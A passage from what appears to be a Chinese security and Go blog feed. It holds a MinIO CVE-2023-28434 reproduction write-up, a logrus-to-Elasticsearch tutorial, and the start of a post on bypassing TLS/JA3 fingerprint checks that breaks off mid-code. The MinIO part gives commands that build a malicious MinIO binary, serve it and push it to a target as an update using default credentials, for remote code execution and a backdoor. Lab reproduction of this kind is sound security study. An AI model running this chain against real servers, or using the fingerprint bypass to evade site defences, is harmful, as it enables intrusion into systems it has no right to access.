id="2-1-配置mc指令："><a href="#2-1-配置mc指令：" class="headerlink" title="2.1 配置mc指令："></a>2.1 配置mc指令：</h2><p>上面所述，minio的mc(minio的客户端)可以远程升级minio服务器，而关键在于升级地址是一个可以通过预自定义的。</p><p>可以从下面的连接进行下载源代码。</p><p><a href="https://github.com/AbelChe/evil_minio">AbelChe&#x2F;evil_minio: EXP for CVE-2023-28434 MinIO unauthorized to RCE (github.com)</a></p><p>查看官方文档，查看使用<code>mc admin</code>的使用：**<a href="https://min.io/docs/minio/linux/reference/minio-mc-admin.html">MinIO Admin Client — MinIO Object Storage for Linux</a>**</p><p><img src="/../../blog_image/image-20231226215918047.png" alt="image-20231226215918047"></p><h2 id="2-2-update实现rce"><a href="#2-2-update实现rce" class="headerlink" title="2.2 update实现rce:"></a>2.2 update实现rce:</h2><p>拉取大佬修改好的minio(其实是懒得找源码，自己修改)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">git clone https://github.com/AbelChe/evil_minio.git<br>go env -w GOPROXY=https://goproxy.cn,direct // 设置代理<br>CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -ldflags=&quot;-s -w&quot; -trimpath //编译<br>//重命名<br>mv minio minio.RELEASE.2023-03-22T06-36-24Z<br>//shasum校验<br>shasum -a 256 minio.RELEASE.2023-03-22T06-36-24Z &gt; minio.RELEASE.2023-03-22T06-36-24Z.sha256sum<br>启动http服务<br>python3 -m http.server 18090<br></code></pre></td></tr></table></figure><p>然后我们可以创建一个桶，直观看到变化：</p><p>接着我们执行更新操作：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">添加 MinIO服务案例</span><br>mc config host add docker_minio1 http://10.10.10.129:9000 minioadmin minioadmin-vulhub<br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-built_in">ls</span>命令 - 列出对象(可以不执行这一步)</span><br>mc ls miniode1<br><span class="hljs-meta prompt_">#</span><span class="language-bash">下载更新包更新</span><br>mc admin update miniode1 http://10.211.55.2:18090/minio.RELEASE.2023-03-22T06-36-24Z.sha256sum -y<br></code></pre></td></tr></table></figure><p><img src="/../../blog_image/image-20231226215932676.png" alt="image-20231226215932676"></p><p>最终效果如图所示：</p><p><img src="/../../blog_image/image-20231226215937704.png" alt="image-20231226215937704"></p><p><img src="/../../blog_image/image-20231226215942747.png" alt="image-20231226215942747"></p><p>成功更新并且实现了rce。</p><h1 id="3-漏洞原理重现："><a href="#3-漏洞原理重现：" class="headerlink" title="3.漏洞原理重现："></a>3.漏洞原理重现：</h1><h2 id="3-1-代码审计："><a href="#3-1-代码审计：" class="headerlink" title="3.1 代码审计："></a>3.1 代码审计：</h2><h3 id="信息泄露从何而来？"><a href="#信息泄露从何而来？" class="headerlink" title="信息泄露从何而来？"></a>信息泄露从何而来？</h3><p>在<code>cmd/routers.go</code>中<code>configureServerHandler</code>是注册路由方法，如图所示：</p><p><img src="/../../blog_image/image-20231226215947872.png" alt="image-20231226215947872"></p><p>其中根据漏洞报告可以知道，信息泄露的相关api是<code>bootStrap</code>相关的。</p><p>因此初步推断是<code>registerDistErasureRouters</code>中注册<code>bootStrap</code>相关的路由，如图所示：</p><p><img src="/../../blog_image/image-20231226215952177.png" alt="image-20231226215952177"></p><p>接着查看<code>registerBootStrapRESTHandlers</code>可以看到<code>verify</code>路由。</p><p><img src="/../../blog_image/image-20231226215959798.png" alt="image-20231226215959798"></p><p>查看<code>server.HealthHandler</code>函数：</p><p><img src="/../../blog_image/image-20231226220004077.png" alt="image-20231226220004077"></p><p>可以看到存在敏感信息，即<code>getServerSystemCfg</code>函数，点击后查看该函数返回的值是<code>ServerSystemConfig</code>结构体，这个结构体中包含了环境变量<code>MINIO_</code>的相关敏感信息：</p><p><img src="/../../blog_image/image-20231226220008853.png" alt="image-20231226220008853"></p><p>获取了环境变量后用了for循环对<code>envValues</code>这个map赋值，而这个<code>skipEnvs</code>就是罪大恶极的map，里面包含了账号密码等敏感信息。</p><p><img src="/../../blog_image/image-20231226220014606.png" alt="image-20231226220014606"></p><p>所以这个<code>skipEnvs[envK]</code>是什么呢？根据官方说明，MinIO在启动时会从环境变量中读取预先设置的用户和密码，默认情况下：minioadmin&#x2F;minioadmin。就是说如果环境变量存在，则不对其赋值，如果不存在则会抛到上一层，最终判断为空则会使用默认账号密码。</p><h3 id="更新RCE从何而来？"><a href="#更新RCE从何而来？" class="headerlink" title="更新RCE从何而来？"></a>更新RCE从何而来？</h3><p>可以查看<code>cmd/update.go</code>，其中全局变量已经设置到了相关的更新路径，如图所示：</p><p><img src="/../../blog_image/image-20231226220018632.png" alt="image-20231226220018632"></p><p>minio在更新的时候会对更新包进行sha256sum，但由于<code>envMinisignPubKey</code>为空，所以校验无效了：</p><p><img src="/../../blog_image/image-20231226220022081.png" alt="image-20231226220022081"></p><h2 id="3-2-无损RCR-后门："><a href="#3-2-无损RCR-后门：" class="headerlink" title="3.2 无损RCR+后门："></a>3.2 无损RCR+后门：</h2><p>如何编写一个路由呢？</p><p>在<code>cmd/routers.go</code>中的<code>globalHandler</code>添加自己的router,如图所示：</p><p><img src="/../../blog_image/image-20231226220026088.png" alt="image-20231226220026088"></p><p>在<code>generic-handlers.go</code>中添加<code>handler</code></p><p><img src="/../../blog_image/image-20231226220030207.png" alt="image-20231226220030207"></p><p>创建一个函数判断当前系统是window还是linux，如图所示：</p><p><img src="/../../blog_image/image-20231226220034525.png" alt="image-20231226220034525"></p><p>参考文章：</p><blockquote><p><a href="https://mp.weixin.qq.com/s/GNhQLuzD8up3VcBRIinmgQ">MinIO从信息泄漏到RCE复现 (qq.com)</a></p><p><a href="https://min.io/docs/minio/linux/reference/minio-mc-admin/mc-admin-update.html">mc admin update — MinIO Object Storage for Linux</a></p><p><a href="https://github.com/AbelChe/evil_minio">AbelChe&#x2F;evil_minio: EXP for CVE-2023-28434 MinIO unauthorized to RCE (github.com)</a></p><p><a href="https://mp.weixin.qq.com/s/GNhQLuzD8up3VcBRIinmgQ">MinIO从信息泄漏到RCE复现 (qq.com)</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>云安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>minio</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>logrus实现日志推送</title>
    <link href="/2023/12/08/golang/logrus%E5%AE%9E%E7%8E%B0%E6%97%A5%E5%BF%97%E6%8E%A8%E9%80%81/"/>
    <url>/2023/12/08/golang/logrus%E5%AE%9E%E7%8E%B0%E6%97%A5%E5%BF%97%E6%8E%A8%E9%80%81/</url>
    
    <content type="html"><![CDATA[<h1 id="1-logrus介绍："><a href="#1-logrus介绍：" class="headerlink" title="1.logrus介绍："></a>1.logrus介绍：</h1><p>导入包：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">go get -u github.com/sirupsen/logrus<br></code></pre></td></tr></table></figure><h2 id="1-1-logrus基础配置："><a href="#1-1-logrus基础配置：" class="headerlink" title="1.1 logrus基础配置："></a>1.1 logrus基础配置：</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> LogrusObj *logrus.Logger<br><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">InitLog</span><span class="hljs-params">()</span></span> &#123;<br>    <span class="hljs-keyword">if</span> LogrusObj != <span class="hljs-literal">nil</span> &#123;<br>       file, err := setOutputFile()<br>       <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>          <span class="hljs-built_in">panic</span>(err)<br>       &#125;<br>       LogrusObj.SetOutput(file)<br>       <span class="hljs-keyword">return</span><br>    &#125;<br>    <span class="hljs-comment">// 初始化</span><br>    logger := logrus.New()<br>    file, err := setOutputFile()<br>    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>       <span class="hljs-built_in">panic</span>(err)<br>    &#125;<br>    logger.SetOutput(file)<br>    logger.SetLevel(logrus.DebugLevel)<br>    logger.SetFormatter(&amp;logrus.JSONFormatter&#123;<br>       TimestampFormat: <span class="hljs-string">&quot;2006-01-02 15:04:05&quot;</span>,<br>    &#125;)<br>    LogrusObj = logger<br>&#125;<br></code></pre></td></tr></table></figure><p><code>setOutputFile</code>函数是设置日志输出的位置，这里的<code>setOutputFile</code>函数如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// setOutputFile 按照日期进行分割，如果不存在则创建，存在就写入日至中</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">setOutputFile</span><span class="hljs-params">()</span></span> (*os.File, <span class="hljs-type">error</span>) &#123;<br>    now := time.Now()<br>    dir, err := os.Getwd()<br>    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>       <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>    &#125;<br>    <span class="hljs-comment">// 设置日志文件位置</span><br>    logFilePath := filepath.Join(dir, <span class="hljs-string">&quot;/logs/&quot;</span>)<br><br>    <span class="hljs-comment">// 使用os.Stat 判断文件或文件夹是否存在</span><br>    <span class="hljs-comment">// 如果返回 err是nil则表明文件或文件夹存在</span><br>    <span class="hljs-comment">// 否则使用os.IsNotExists() 判断 ==》 如果为true则表明文件或文件夹不存在</span><br>    _, err = os.Stat(logFilePath)<br>    <span class="hljs-keyword">if</span> os.IsNotExist(err) &#123;<br>       <span class="hljs-comment">// true 文件夹或文件不存在</span><br>       <span class="hljs-keyword">if</span> err = os.MkdirAll(logFilePath, <span class="hljs-number">0777</span>); err != <span class="hljs-literal">nil</span> &#123;<br>          log.Fatal(err)<br>          <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>       &#125;<br>    &#125;<br>    <span class="hljs-comment">// 文件夹存在</span><br>    logFileName := now.Format(FileNameLayOut) + <span class="hljs-string">&quot;.log&quot;</span><br>    fileName := filepath.Join(logFilePath, logFileName)<br><br>    <span class="hljs-comment">// err不为空 则需要使用os.IsNotExists()判断文件是否存在</span><br>    <span class="hljs-keyword">if</span> _, err = os.Stat(fileName); err != <span class="hljs-literal">nil</span> &#123;<br>       <span class="hljs-keyword">if</span> os.IsNotExist(err) &#123;<br>          <span class="hljs-comment">// 创建文件</span><br>          <span class="hljs-keyword">if</span> _, err = os.Create(fileName); err != <span class="hljs-literal">nil</span> &#123;<br>             log.Fatal(err)<br>             <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>          &#125;<br>       &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// 写入文件</span><br>    <span class="hljs-comment">// O_WRONLY 以只写的方式</span><br>    <span class="hljs-comment">// O_APPEND 追加</span><br>    <span class="hljs-comment">// ModeAppend 只能写 且只能写到末尾</span><br>    file, err := os.OpenFile(fileName, os.O_APPEND|os.O_WRONLY, os.ModeAppend)<br>    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>       <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> file, err<br>&#125;<br></code></pre></td></tr></table></figure><p>主要逻辑有以下：</p><ul><li>获取项目的位置</li><li>使用<code>filepath.Join</code>将文件地址后加上<code>log</code></li><li>使用<code>os.Stat</code>用于判断文件或文件夹是否存在，如果返回err是nil表明存在，如果不为nil则需要使用<code>os.IsNotExists()</code>，如果返回true表明文件或文件夹不存在</li><li>文件夹不存在则创建，使用<code>os.MkdirAll(路径，权限)</code>。</li><li>文件夹存在，则可以组装日志文件的文件名，然后通过这个文件名去判断当前文件是否存在，如果不存在则创建。</li><li>如果文件存在则可以直接进行追加，需要注意这里需要提供flag。<code> os.O_APPEND|os.O_WRONLY, os.ModeAppend</code>分别表示以只写的方式，追加的方式，后面的<code>os.ModeAppend</code>表示给写的权限并且只能写道末尾。</li></ul><p>效果如图</p><p><img src="/../../blog_image/image-20231208133115437.png" alt="image-20231208133115437"></p><h2 id="1-2-logrus的其他配置："><a href="#1-2-logrus的其他配置：" class="headerlink" title="1.2 logrus的其他配置："></a>1.2 logrus的其他配置：</h2><p>logrus可以使用<code>WithFields</code>添加自己的一个字段，如：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go">logger := logrus.New()<br>logger.SetLevel(logrus.DebugLevel)<br>entry := logger.WithFields(logrus.Fields&#123;<br>    <span class="hljs-string">&quot;作者&quot;</span>: <span class="hljs-string">&quot;cz&quot;</span>,<br>&#125;)<br><br>entry.Info(<span class="hljs-string">&quot;nihao&quot;</span>)<br></code></pre></td></tr></table></figure><p><img src="/../../blog_image/image-20231208133129801.png" alt="image-20231208133129801"></p><p>可以使用<code>entry.Data</code>返回的是一个<code>map[string]interface&#123;&#125;</code>就是刚才设置<code>WithFields</code>的值。</p><h2 id="1-3-logrus的hook："><a href="#1-3-logrus的hook：" class="headerlink" title="1.3 logrus的hook："></a>1.3 logrus的hook：</h2><p>只需要实现<code>hook</code>这个接口，就可以了。</p><p>logrus调用中添加<code>AddHook(hook)</code>即可。</p><p>logrus的hook接口需要实现两个方法，如下：</p><p><img src="/../../blog_image/image-20231208133142522.png" alt="image-20231208133142522"></p><p>其中<code>Levels</code>方法是返回什么日志级别才会触发hook的，而<code>Fire</code>则是具体实现hook的逻辑。</p><h1 id="2-配置Es"><a href="#2-配置Es" class="headerlink" title="2.配置Es"></a>2.配置Es</h1><p>引用库：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">github.com/elastic/<span class="hljs-keyword">go</span>-elasticsearch<br></code></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs GO"><span class="hljs-keyword">var</span> EsClient *elasticsearch.Client<br><br><span class="hljs-comment">// InitEs 初始化es</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">InitEs</span><span class="hljs-params">()</span></span> &#123;<br>    esConn := fmt.Sprintf(<span class="hljs-string">&quot;http://%s:%s&quot;</span>, <span class="hljs-string">&quot;192.168.61.129&quot;</span>, <span class="hljs-string">&quot;9200&quot;</span>)<br>    cfg := elasticsearch.Config&#123;<br>       Addresses: []<span class="hljs-type">string</span>&#123;esConn&#125;,<br>    &#125;<br>    client, err := elasticsearch.NewClient(cfg)<br>    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>       log.Panic(err)<br>    &#125;<br>    EsClient = client<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="3-logrus实现日志推送"><a href="#3-logrus实现日志推送" class="headerlink" title="3.logrus实现日志推送"></a>3.logrus实现日志推送</h1><p>先定义一个结构体ElasticHook，其中需要实现<code>Hook</code>接口：</p><p><img src="/../../blog_image/image-20231208133151441.png" alt="image-20231208133151441"></p><p>ElasticHook结构体如图所示：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> ElasticHook <span class="hljs-keyword">struct</span> &#123;<br>    Client        *elasticsearch.Client <span class="hljs-comment">// es的客户端</span><br>    Host          <span class="hljs-type">string</span>                <span class="hljs-comment">// es的host</span><br>    Index         IndexNameFunc         <span class="hljs-comment">// 获取索引的名字</span><br>    Level         []logrus.Level        <span class="hljs-comment">// 日志级别</span><br>    Ctx           context.Context       <span class="hljs-comment">// 上下文</span><br>    CtxCancelFunc context.CancelFunc    <span class="hljs-comment">// 上下文的函数</span><br>    FireFunc      FireFunc              <span class="hljs-comment">// 执行hook的方法</span><br>&#125;<br></code></pre></td></tr></table></figure><p>初始化es钩子：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// NewElasticHook 创建一个es hook对象</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">NewElasticHook</span><span class="hljs-params">(client *elasticsearch.Client, host <span class="hljs-type">string</span>, level logrus.Level, index <span class="hljs-type">string</span>)</span></span> (*ElasticHook, <span class="hljs-type">error</span>) &#123;<br>    <span class="hljs-keyword">return</span> newElasticHookWithFunc(client, host, level, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> <span class="hljs-type">string</span> &#123; <span class="hljs-keyword">return</span> index &#125;)<br>&#125;<br></code></pre></td></tr></table></figure><p>具体逻辑如图：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// newElasticHookWithFunc 创建一个es hook对象，通过IndexNameFunc这个方式</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">newElasticHookWithFunc</span><span class="hljs-params">(client *elasticsearch.Client, host <span class="hljs-type">string</span>, level logrus.Level, indexFunc IndexNameFunc)</span></span> (*ElasticHook, <span class="hljs-type">error</span>) &#123;<br>    <span class="hljs-keyword">var</span> levels []logrus.Level<br>    <span class="hljs-keyword">for</span> _, l := <span class="hljs-keyword">range</span> logrus.AllLevels &#123;<br>       <span class="hljs-comment">// 判断传入的level是在哪个等级上面</span><br>       <span class="hljs-keyword">if</span> level &gt;= l &#123;<br>          levels = <span class="hljs-built_in">append</span>(levels, l)<br>       &#125;<br>    &#125;<br>    ctx, cancelFunc := context.WithCancel(context.Background())<br>    <span class="hljs-keyword">return</span> &amp;ElasticHook&#123;<br>       Client:        client,<br>       Host:          host,<br>       Index:         indexFunc,<br>       Level:         levels,<br>       Ctx:           ctx,<br>       CtxCancelFunc: cancelFunc,<br>       FireFunc:      syncFireFunc,<br>    &#125;, <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><p>传入的level需要进行比较，比较日志是大于或等于的才会保存在这个钩子中的<code>Level</code>字段。</p><p>具体发送逻辑是<code>syncFireFunc</code>这个函数，具体用法如下：</p><p>主要是操作es逻辑。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// syncFireFunc 异步发送 实现hook函数的具体逻辑</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">syncFireFunc</span><span class="hljs-params">(entry *logrus.Entry, hook *ElasticHook)</span></span> <span class="hljs-type">error</span> &#123;<br>    msg := createMessage(entry, hook)<br>    data, err := json.Marshal(&amp;msg)<br>    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>       <span class="hljs-keyword">return</span> err<br>    &#125;<br><br>    <span class="hljs-comment">// 操作es</span><br>    request := esapi.IndexRequest&#123;<br>       Index:   hook.Index(),<br>       Body:    bytes.NewReader(data),<br>       Refresh: <span class="hljs-string">&quot;true&quot;</span>,<br>    &#125;<br><br>    <span class="hljs-comment">// 发送请求</span><br>    resp, err := request.Do(hook.Ctx, hook.Client)<br>    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>       <span class="hljs-keyword">return</span> err<br>    &#125;<br><br>    <span class="hljs-comment">// 解析响应</span><br>    <span class="hljs-comment">// todo 完善解析json的操作</span><br>    log.Println(resp.String())<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><p>将这个赋值给<code>ElasticHook</code>的<code>FireFunc</code>，在调用钩子的时候调用即可。</p><p>最终使用<code>curl --location &#39;http://localhost:9200/my_index/_search&#39;\?pretty </code></p><p>即可查看到结果</p><h1 id="4-完整代码"><a href="#4-完整代码" class="headerlink" title="4.完整代码"></a>4.完整代码</h1><p>查看<a href="">https://github.com/pow1e/es-logrus</a></p>]]></content>
    
    
    <categories>
      
      <category>golang开发</category>
      
    </categories>
    
    
    <tags>
      
      <tag>golang</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>tls指纹绕过</title>
    <link href="/2023/12/02/tls%E6%8C%87%E7%BA%B9%E7%BB%95%E8%BF%87/"/>
    <url>/2023/12/02/tls%E6%8C%87%E7%BA%B9%E7%BB%95%E8%BF%87/</url>
    
    <content type="html"><![CDATA[<p>浏览器可以正常访问，但是用requests发送请求失败。</p><p>后端是如何监测得呢？为什么浏览器可以返回结果，而requests模块不行呢？</p><p><a href="https://cn.investing.com/equities/amazon-com-inc-historical-data">https://cn.investing.com/equities/amazon-com-inc-historical-data</a></p><p><img src="/./../blog_image/image-20231102222853489.png" alt="image-20231102222853489"></p><p><img src="/./../blog_image/image-20231102222951995.png" alt="image-20231102222951995"></p><h1 id="1-指纹校验案例"><a href="#1-指纹校验案例" class="headerlink" title="1.指纹校验案例"></a>1.指纹校验案例</h1><h2 id="1-1-案例：ascii2d"><a href="#1-1-案例：ascii2d" class="headerlink" title="1.1 案例：ascii2d"></a>1.1 案例：ascii2d</h2><p><a href="https://ascii2d.net/">https://ascii2d.net/</a></p><p><img src="/./../blog_image/image-20231102152118149.png" alt="image-20231102152118149"></p><p><img src="/./../blog_image/image-20231102152223565.png" alt="image-20231102152223565"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>res = requests.get(<br>    url=<span class="hljs-string">&quot;https://ascii2d.net&quot;</span><br>)<br><br><span class="hljs-built_in">print</span>(res.text)<br></code></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en-US&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Just a moment...<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;Content-Type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html; charset=UTF-8&quot;</span> /&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br>   ...<br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="1-2-案例：investing"><a href="#1-2-案例：investing" class="headerlink" title="1.2 案例：investing"></a>1.2 案例：investing</h2><p><a href="https://cn.investing.com/equities/amazon-com-inc-historical-data">https://cn.investing.com/equities/amazon-com-inc-historical-data</a></p><p><img src="/./../blog_image/image-20231102222853489.png" alt="image-20231102222853489"></p><p><img src="/./../blog_image/image-20231102222951995.png" alt="image-20231102222951995"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>res = requests.get(<br>    url=<span class="hljs-string">&quot;https://cn.investing.com/equities/amazon-com-inc-historical-data&quot;</span>,<br>    headers=&#123;<br>        <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36&#x27;</span>,<br>    &#125;<br>)<br>res.encoding = <span class="hljs-string">&#x27;utf-8&#x27;</span><br><span class="hljs-built_in">print</span>(res.text)<br></code></pre></td></tr></table></figure><h2 id="1-3-案例：yuanrenxue"><a href="#1-3-案例：yuanrenxue" class="headerlink" title="1.3 案例：yuanrenxue"></a>1.3 案例：yuanrenxue</h2><p><img src="/./../blog_image/image-20231102152648185.png" alt="image-20231102152648185"></p><p><img src="/./../blog_image/image-20231102152734717.png" alt="image-20231102152734717"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>res = requests.get(<br>    url=<span class="hljs-string">&quot;https://match.yuanrenxue.cn/api/match/19?page=1&quot;</span><br>)<br><br><span class="hljs-built_in">print</span>(res.text)<br></code></pre></td></tr></table></figure><h1 id="2-TLS指纹"><a href="#2-TLS指纹" class="headerlink" title="2.TLS指纹"></a>2.TLS指纹</h1><p>如今几乎所有平台通信都是基于Https的协议，而无论基于什么工具去发送Https请求时，都需要基于TLS&#x2F;SSL先建立两端安全的通信（握手），建立后再进行数据传输。</p><p>TLS的握手阶段，客户端会向服务端发送 Client Hello 数据包，在数据包内的<code>JA3</code>就是指纹信息（基于电脑的TLS版本+内置算法等计算出来的字符串），并且该值不会随着请求头修改、代理等发生变化。所以，某个网站的后台就会去读取TLS客户端的<code>JA3</code>指纹，如果是非正常指纹，禁止访问。例如：</p><ul><li><p>requests请求</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">requests</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-number">2.31</span>.<span class="hljs-number">0</span><br><span 